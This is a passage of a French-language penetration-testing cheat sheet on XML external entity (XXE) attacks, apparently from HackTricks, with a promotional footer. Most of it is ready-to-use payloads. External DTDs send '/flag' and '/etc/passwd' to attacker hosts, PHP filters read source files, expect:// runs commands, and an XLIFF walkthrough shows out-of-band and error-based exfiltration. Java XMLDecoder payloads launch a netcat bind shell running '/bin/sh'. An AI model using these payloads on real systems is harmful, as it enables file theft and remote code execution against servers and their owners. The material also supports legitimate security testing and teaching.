<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Exemple de DTD :
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Enveloppes PHP

### Base64

**Extraire** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extraire une ressource externe**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Ex√©cution de code √† distance

**Si le module "expect" de PHP est charg√©**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Cet exemple est inspir√© de [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) est utilis√© pour standardiser l'√©change de donn√©es dans les processus de localisation. C'est un format bas√© sur XML principalement utilis√© pour transf√©rer des donn√©es localisables entre des outils lors de la localisation et comme format d'√©change commun pour les outils CAT (Computer-Aided Translation).

### Analyse de la requ√™te aveugle

Une requ√™te est envoy√©e au serveur avec le contenu suivant:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Cependant, cette requ√™te d√©clenche une erreur interne du serveur, mentionnant sp√©cifiquement un probl√®me avec les d√©clarations de balisage :
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Malgr√© l'erreur, un hit est enregistr√© sur Burp Collaborator, indiquant un certain niveau d'interaction avec l'entit√© externe.

Exfiltration de donn√©es hors bande Pour exfiltrer des donn√©es, une requ√™te modifi√©e est envoy√©e:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Cet approche r√©v√®le que l'Agent utilisateur indique l'utilisation de Java 1.8. Une limitation not√©e avec cette version de Java est l'incapacit√© de r√©cup√©rer des fichiers contenant un caract√®re de nouvelle ligne, tel que /etc/passwd, en utilisant la technique Out of Band.

Exfiltration de donn√©es bas√©e sur les erreurs Pour surmonter cette limitation, une approche bas√©e sur les erreurs est utilis√©e. Le fichier DTD est structur√© comme suit pour d√©clencher une erreur qui inclut des donn√©es d'un fichier cible:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Le serveur r√©pond avec une erreur, indiquant de mani√®re importante le fichier inexistant, ce qui indique que le serveur tente d'acc√©der au fichier sp√©cifi√© :
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Pour inclure le contenu du fichier dans le message d'erreur, le fichier DTD est ajust√© :
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Cette modification conduit √† l'exfiltration r√©ussie du contenu du fichier, comme le refl√®te la sortie d'erreur envoy√©e via HTTP. Cela indique une attaque XXE (Entit√© Externe XML) r√©ussie, exploitant √† la fois des techniques Out of Band et Error-Based pour extraire des informations sensibles.

## RSS - XEE

XML valide au format RSS pour exploiter une vuln√©rabilit√© XXE.

### Ping back

Requ√™te HTTP simple vers le serveur des attaquants
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lire le fichier
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lire le code source

En utilisant le filtre base64 PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder est une classe Java qui cr√©e des objets bas√©s sur un message XML. Si un utilisateur malveillant peut amener une application √† utiliser des donn√©es arbitraires dans un appel √† la m√©thode **readObject**, il obtiendra instantan√©ment l'ex√©cution de code sur le serveur.

### Utilisation de Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Outils

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## R√©f√©rences

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Extraire des informations via HTTP en utilisant sa propre DTD externe : [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)


<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
